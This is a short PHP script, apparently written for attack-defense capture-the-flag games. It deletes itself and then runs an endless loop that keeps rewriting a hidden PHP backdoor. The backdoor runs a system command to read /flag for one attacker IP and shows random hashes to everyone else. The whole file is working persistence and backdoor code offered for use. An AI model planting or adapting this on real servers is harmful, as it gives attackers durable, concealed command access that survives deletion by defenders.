<?php 
	//By ZacharyZcR
	ignore_user_abort(true);
	set_time_limit(0);
	unlink(__FILE__);
	$file = '需要改成.php';
	$code = '<?php 
	$ip = $_SERVER["REMOTE_ADDR"];
	if($ip=="需要改成自己IP"){
		echo("Administrator Confirmation.\r\n");
		system("cat /flag");
	}
	else echo(md5(mt_rand()));?>';
	while (1){
		file_put_contents($file,$code);
		usleep(5000);
}
?>
